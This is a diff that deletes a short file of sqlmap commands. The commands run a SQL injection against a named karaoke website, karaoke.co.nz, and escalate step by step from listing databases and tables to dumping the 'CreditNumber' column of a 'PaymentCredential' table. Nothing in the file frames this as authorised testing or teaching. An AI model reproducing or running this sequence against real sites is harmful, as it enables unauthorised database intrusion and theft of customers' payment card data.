@@ -1,7 +1,0 @@
-sqlmap
-sqlmap -u "http://karaoke.co.nz/items/index.php?id=37" --dbs  
-sqlmap -u "http://karaoke.co.nz/items/index.php?id=37" --dbs claireg_karaoke --tables
-sqlmap -u "http://karaoke.co.nz/items/index.php?id=37" --dbs claireg_karaoke --tables PaymentCredential --column 
-sqlmap -u "http://karaoke.co.nz/items/index.php?id=37" --dbs claireg_karaoke -T PaymentCredential -C CreditNumber --dump
-sqlmap -u "http://karaoke.co.nz/items/index.php?id=37" --dbs claireg_karaoke -T PaymentCredential -C CreditNumber --dump-all
-
